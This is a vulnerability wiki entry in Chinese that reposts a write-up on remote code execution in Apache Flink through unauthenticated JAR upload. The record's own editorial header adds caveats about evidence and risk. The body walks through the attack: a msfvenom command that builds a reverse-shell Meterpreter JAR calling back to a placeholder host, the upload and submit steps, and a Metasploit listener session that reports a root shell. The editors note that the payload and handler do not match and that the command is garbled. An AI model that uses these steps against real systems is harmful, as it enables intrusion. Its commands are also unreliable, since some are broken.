---
source: "MrWQ/vulnerability-paper"
title: "Apache Flink (最新版本) 远程代码执行"
product: "Apache Flink"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "Dashboard 可达、上传/运行 JAR 能力未受访问控制，回连可达；权限取决于服务账户"
source_url: "https://mp.weixin.qq.com/s/HPTVat9BwLjfFIqX_zZEIA"
source_status: "recorded"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
id: "vw-0884839a3348baccf8fc6f84"
entity_id: "ve-0884839a3348baccf8fc6f84"
schema_version: "1"
---

# Apache Flink (最新版本) 远程代码执行

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Dashboard 可达、上传/运行 JAR 能力未受访问控制，回连可达；权限取决于服务账户
- 证据范围：描述正常作业上传执行功能被未授权调用，不足以绑定路径遍历 CVE。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 标题最新版本和 <=1.9.1 为历史无日期快照，不能作当前影响范围
- 生成 Meterpreter JAR 却使用 java/shell/reverse_tcp handler，载荷类型不一致
- msfvenom 参数混用非 ASCII 横线，LPORT 与 -f 粘连
- 直接 root 权限仅是实验运行用户，不是漏洞保证
- 关键提交参数与 POC 仅图片

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HPTVat9BwLjfFIqX_zZEIA)

**路虽远，行则将至，事虽难，做则必成**

**漏洞描述：**

近日, 有安全研究员公开了一个 Apache Flink 的任意 Jar 包上传导致远程代码执行的漏洞. 

**漏洞影响：**

Apache Flink <= 1.9.1(最新版本)

**漏洞复现：**

漏洞 url： 

```
http://x.x.x.x

```

打开一个使用 Apache Flink 的网站，打开后页面为这样子  

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwom3e1ZmCTQJeEEAIrRDOQbCfFBZ47ufHrtVP0eFIaicLpYe4icd5CX2QUUW6bYhbiabSdIeGopXcBg/640?wx_fmt=png)

点击查看文件上传页面

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwom3e1ZmCTQJeEEAIrRDOQnL6qq4xOG5yETdQSn3qibvTlE7oiaIXjc0icHnTFUUaNHLnGEATXHFfAA/640?wx_fmt=png)

打开 MSF 生成一个 jar 木马

```
msfvenom ‐p java/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxx‐f jar > test.jar

```

点击 Add 上传 jar 文件

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwom3e1ZmCTQJeEEAIrRDOQnL6qq4xOG5yETdQSn3qibvTlE7oiaIXjc0icHnTFUUaNHLnGEATXHFfAA/640?wx_fmt=png)

msf 进行监听端口

```
msf5 > use exploit/multi/handler
2 msf5 exploit(multi/handler) > set payload java/shell/reverse_tcp
3 payload => java/shell/reverse_tcp
4 msf5 exploit(multi/handler) > set lhost x.x.x.x
5 lhost => x.x.x.x
6 msf5 exploit(multi/handler) > set lport xxx
7 lport => xxx
8 msf5 exploit(multi/handler) > run
9
10 [*] Started reverse TCP handler on x.x.x.x

```

如下

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwom3e1ZmCTQJeEEAIrRDOQuGeJ1ibNXyXd2mW5VcSficXlfLWxjl5OJUQIznh3dII6YWAJapcrjvjw/640?wx_fmt=png)

点击下 submit

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwom3e1ZmCTQJeEEAIrRDOQOzKXibdt2r38PnVIy6YswDMu0B3qGgNZNZnGEXtwxbgQiaKw8upIrEUA/640?wx_fmt=png)

直接反弹回来一个 root 权限的 shell  

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwom3e1ZmCTQJeEEAIrRDOQtfoOAS3gFGp4UrlxtjIwuZ0xibAAhltvNfcwh6Asa95e1KNrNjaJCDg/640?wx_fmt=png)

漏洞利用 POC

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwom3e1ZmCTQJeEEAIrRDOQYdbt89g7jAqPED9sRgJ4mjd0koHxjl3bwQMYHZB7Vh2fGnOhcRKfqQ/640?wx_fmt=png)

文笔生疏，措辞浅薄，望各位大佬不吝赐教，万分感谢。

免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。

转载声明：儒道易行 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。

```
CSDN:
https://blog.csdn.net/weixin_48899364?type=blog
公众号：
https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg5NTU2NjA1Mw==&action=getalbum&album_id=1696286248027357190&scene=173&from_msgid=2247485408&from_itemidx=1&count=3&nolastread=1#wechat_redirect
博客:
https://rdyx0.github.io/
先知社区：
https://xz.aliyun.com/u/37846
SecIN:
https://www.sec-in.com/author/3097
FreeBuf：
https://www.freebuf.com/author/%E5%9B%BD%E6%9C%8D%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E6%8E%8C%E6%8E%A7%E8%80%85

```

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
